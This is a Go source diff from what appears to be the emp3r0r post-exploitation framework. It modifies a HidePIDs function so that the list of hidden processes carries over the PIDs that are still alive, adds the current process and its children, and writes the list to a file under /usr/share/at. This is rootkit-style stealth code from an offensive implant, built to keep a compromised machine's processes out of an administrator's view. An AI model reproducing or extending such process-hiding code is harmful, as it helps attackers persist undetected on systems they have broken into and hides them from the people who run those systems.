@@ -11,6 +11,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"strconv"
 	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -204,22 +205,36 @@ func HidePIDs() (err error) {
 		os.MkdirAll("/usr/share/at", 0755)
 	}
 
+	// read PID list
+	// add PIDs that are still running
+	existing_pids := ""
+	data, err := os.ReadFile(Hidden_PIDs)
+	if err == nil {
+		pids := strings.Split(string(data), "\n")
+		for _, pid_str := range pids {
+			if pid_str != "" {
+				pid, err := strconv.Atoi(pid_str)
+				if err != nil {
+					continue
+				}
+				// check if PID is alive
+				if util.IsPIDAlive(pid) {
+					log.Printf("PID %d is alive, keep hidden", pid)
+					existing_pids += fmt.Sprintf("%d\n", pid)
+				}
+			}
+		}
+	}
+
 	// hide this process and all children
 	pid := os.Getpid()
 	children, err := util.GetChildren(pid)
 	if err != nil {
 		return
 	}
-	pids := fmt.Sprintf("%d", pid)
-
-	// agent PID
-	alive, agent_pid := IsAgentRunningPID()
-	if alive {
-		pids = fmt.Sprintf("%d\n%d", pid, agent_pid)
-	}
-
+	pids := fmt.Sprintf("%s%d\n", existing_pids, pid)
 	for _, child := range children {
-		pids += fmt.Sprintf("\n%d", child)
+		pids += fmt.Sprintf("%d\n", child)
 	}
 	err = ioutil.WriteFile(Hidden_PIDs, []byte(pids), 0644)
 	if err != nil {
